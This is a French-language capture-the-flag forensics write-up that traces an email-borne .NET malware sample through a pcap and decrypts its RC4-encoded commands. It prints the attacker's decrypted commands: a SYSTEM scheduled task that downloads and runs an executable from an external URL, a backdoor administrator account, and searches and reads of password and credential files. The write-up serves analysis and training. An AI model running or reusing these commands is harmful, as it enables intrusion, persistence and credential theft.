# Silent Trap
### A critical incident has occurred in Tales from Eldoria, trapping thousands of players in the virtual world with no way to log out. The cause has been traced back to Malakar, a mysterious entity that launched a sophisticated attack, taking control of the developers' and system administrators' computers. With key systems compromised, the game is unable to function properly, which is why players remain trapped in Eldoria. Now, you must investigate what happened and find a way to restore the system, freeing yourself from the game before it's too late.

Le challenge commence avec un fichier **pcap**, en l'éxaminant rapidement, c'est un échange de mail.

### Flag 1 : What is the subject of the first email that the victim opened and replied to ?

Le sujet de l'email peut être identifié sur le HTTP Stream 4 :   

![wireshark1](https://github.com/user-attachments/assets/4912275e-7eec-40b0-a9f0-e22b95711e61)

### Flag 2 : Question 2: On what date and time was the suspicious email sent ?

En continuant de chercher dans les HTTP Stream, on tombe là dessus sur le 8 :   

![wiresahrk2](https://github.com/user-attachments/assets/58814647-dba8-4678-ab40-14953ef00c81)
On y voit la date du mail, et l'envoi du fichier `Eldoria_Balance_Issue_Report.zip`.

### Flag 3 : What is the MD5 hash of the malware file ?

On repère alors le fameux ZIP envoyé : 

![wireshark3](https://github.com/user-attachments/assets/4aa0c099-ed5c-44cb-a8ef-7be54c912184)

On exporte alors ce fichier sur Wireshark, mais l'archive est protégé par un mot de passe (merci ):   

![zip mdp](https://github.com/user-attachments/assets/6042393e-d16d-499b-ac1f-21bc450eaa27)

On continue alors de fouiller un peu les mails, et on trouve l'échange de mails avec le mot de passe :   

![wireshark5](https://github.com/user-attachments/assets/6cd57513-f3cb-4efd-885f-eea85ca43dd5)

On peut donc avoir accès à l'archive zip et en extraire `Eldoria_Balance_Issue_Report.pdf.exe` après l'avoir clean-up avec :
```bash
dd if=Eldoria.zip of=clean2.zip bs=1 skip=1259
 ```
Puis on peut récupérer son hash md5 :   
 
![extraire](https://github.com/user-attachments/assets/75a48aab-0a4a-447f-8207-8f3363ba4ca4)
![md5](https://github.com/user-attachments/assets/ea3af082-033e-45f6-8b8b-b4d998318001)

### Flag 4 :  What credentials were used to log into the attacker’s mailbox ?

Donc maintenant, nous avons accès au malware qui est un `.NET executable`. On le désassemble grâce à **dotPeek**. 

Dans la premère fonction visible, on peut directement y trouver les identifiants, aussi visibles dans les trames wireshark.  

![creds](https://github.com/user-attachments/assets/dfee5cd9-c035-4a07-a0bb-955f2eec7db1)

### Flag 5 :  What is the name of the task scheduled by the attacker ?

Maintenant il nous faut comprendre comment l'encryption marche, pour pouvori décrypter le reste des trames dans la capture Wireshark. Ici on peut comprendre un peu plus ce qu'il ce passe :   

![fonctionnement file](https://github.com/user-attachments/assets/8da47bde-ce7e-4e6c-a684-5a7a6074b9cd)

Le malware essaye de se connecter à un serveur mail, pour ensuite y éxécuter des commandes CMD encodés en XOR et base64, probablement pour en extraire des fichiers à ce que montre les trames Wireshark.
En fouillant encore un peu, on trouve alors le fonctionnement de l'encryption, et on trouve la clé XOR, qui elle même est encrypté avec RC4.

Au passage, merci à @Kaddate pour m'aider à comprendre parfaitement tout ce qu'il ce passait dans ce programme :D

 ![xor key](https://github.com/user-attachments/assets/44b4dc62-28bc-4990-b582-8b9678c99c4b)
 ![exor](https://github.com/user-attachments/assets/0615f2a4-9ca1-4bc6-bc6f-7cd46b8ce7bc)

Maintenant qu'on à toutes ces informations, on peut décrypter les commandes CMD que l'attaquant éxécute sur le serveur en extrayant toutes les trams IMF après un FETCH de l'attaquant :   

![ttt](https://github.com/user-attachments/assets/76911b01-abf9-4dfd-bf26-fc4e65f835b3)

Puis, avec ce code : 
```python
import base64

def rc4(key, data):
    S = list(range(256))
    j = 0
    out = bytearray()

    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])

    return bytes(out)

b64_data = """<data>"""
key = bytes([<xor_key>]) 

data = base64.b64decode(b64_data)
decrypted = rc4(key, data)

print(decrypted.decode(errors="ignore"))
```
(Merci beaucoup à @n0rozapy pour l'aide sur ce script)

On peut désormais décrypter toutes les commandes que l'attaquant envoi, on obtient alors : 
```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn

schtasks /create /tn Synchronization /tr "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://www.mediafire.com/view/wlq9mlfrl0nlcuk/rakalam.exe/file -OutFile C:\Temp\rakalam.exe" /sc minute /mo 1 /ru SYSTEM

net user devsupport1 P@ssw0rd /add
net localgroup Administrators devsupport1 /add
reg query HKLM /f "password" /t REG_SZ /s
dir C:\ /s /b | findstr "password"

more "C:\Users\dev-support\AppData\Local\BraveSoftware\Brave-Browser\User Data\ZxcvbnData\3\passwords.txt"
more C:\backups\credentials.txt
whoami /priv
tasklist /v
```
Le nom de la tâche éxéctuée est **Synchronization**.

### Flag What is the API key leaked from the highly valuable file discovered by the attacker ?
On voit ici que l'attaquant fouille le fichier `credentials.txt`, on voit clairement sur Wireshark la réponse du serveur, donc le fichier en question :   

![api key](https://github.com/user-attachments/assets/88b839db-e126-4565-a11b-261f94ca1e84)

On exporte tout ça, puis on le passe dans le même script python que pour les commandes CMD. Ce qui nous donne :   

![api key finale](https://github.com/user-attachments/assets/47c51d14-206e-45da-a107-79f1f823d73b)

Et voilà, 6 flags sur 6. 
